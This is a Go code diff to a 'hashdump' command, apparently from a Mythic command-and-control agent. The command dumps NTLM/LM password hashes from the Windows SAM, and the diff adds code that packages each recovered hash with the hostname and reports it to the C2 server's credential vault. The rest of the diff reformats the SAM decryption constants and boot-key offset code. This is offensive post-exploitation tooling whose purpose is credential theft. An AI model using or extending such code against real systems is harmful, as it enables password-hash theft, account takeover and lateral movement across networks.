@@ -13,6 +13,7 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"os"
 	"strings"
 	"unicode/utf16"
 	"unsafe"
@@ -106,17 +107,34 @@ func (c *HashdumpCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Format output
+	// Format output and build credential entries for Mythic's credential vault
+	hostname, _ := os.Hostname()
 	var sb strings.Builder
+	var creds []structs.MythicCredential
 	for _, u := range users {
 		sb.WriteString(fmt.Sprintf("%s:%d:%s:%s:::\n", u.username, u.rid, u.lmHash, u.ntHash))
+
+		// Report NTLM hash to Mythic credential vault
+		if u.ntHash != emptyNTHash {
+			creds = append(creds, structs.MythicCredential{
+				CredentialType: "hash",
+				Realm:          hostname,
+				Account:        u.username,
+				Credential:     fmt.Sprintf("%s:%d:%s:%s:::", u.username, u.rid, u.lmHash, u.ntHash),
+				Comment:        "hashdump (SAM)",
+			})
+		}
 	}
 
-	return structs.CommandResult{
+	result := structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
+	if len(creds) > 0 {
+		result.Credentials = &creds
+	}
+	return result
 }
 
 type userHash struct {
@@ -128,12 +146,12 @@ type userHash struct {
 
 // Constants for SAM hash decryption
 var (
-	samQWERTY    = []byte("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00")
-	samDIGITS    = []byte("0123456789012345678901234567890123456789\x00")
-	samNTPASSWD  = []byte("NTPASSWORD\x00")
-	samLMPASSWD  = []byte("LMPASSWORD\x00")
-	emptyLMHash  = "aad3b435b51404eeaad3b435b51404ee"
-	emptyNTHash  = "31d6cfe0d16ae931b73c59d7e0c089c0"
+	samQWERTY   = []byte("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00")
+	samDIGITS   = []byte("0123456789012345678901234567890123456789\x00")
+	samNTPASSWD = []byte("NTPASSWORD\x00")
+	samLMPASSWD = []byte("LMPASSWORD\x00")
+	emptyLMHash = "aad3b435b51404eeaad3b435b51404ee"
+	emptyNTHash = "31d6cfe0d16ae931b73c59d7e0c089c0"
 )
 
 // Boot key permutation table
@@ -309,8 +327,8 @@ func deriveHashedBootKeyRC4(fValue, bootKey []byte) ([]byte, byte, error) {
 		return nil, 0, fmt.Errorf("F value too short for RC4 key data")
 	}
 
-	salt := fValue[0x70:0x80]       // offset 0x68 + 8 = 0x70
-	encKey := fValue[0x80:0x90]     // offset 0x68 + 0x18 = 0x80
+	salt := fValue[0x70:0x80]        // offset 0x68 + 8 = 0x70
+	encKey := fValue[0x80:0x90]      // offset 0x68 + 0x18 = 0x80
 	encChecksum := fValue[0x90:0xA0] // offset 0x68 + 0x28 = 0x90
 
 	// Derive RC4 key: MD5(salt + QWERTY + bootKey + DIGITS)
@@ -358,8 +376,8 @@ func deriveHashedBootKeyAES(fValue, bootKey []byte) ([]byte, byte, error) {
 	}
 
 	dataLen := binary.LittleEndian.Uint32(fValue[0x74:0x78]) // offset 0x68 + 0x0C
-	salt := fValue[0x78:0x88]                                 // offset 0x68 + 0x10
-	encData := fValue[0x88 : 0x88+dataLen]                    // offset 0x68 + 0x20
+	salt := fValue[0x78:0x88]                                // offset 0x68 + 0x10
+	encData := fValue[0x88 : 0x88+dataLen]                   // offset 0x68 + 0x20
 
 	if len(encData) < 16 || len(encData)%aes.BlockSize != 0 {
 		// Pad to block size if needed
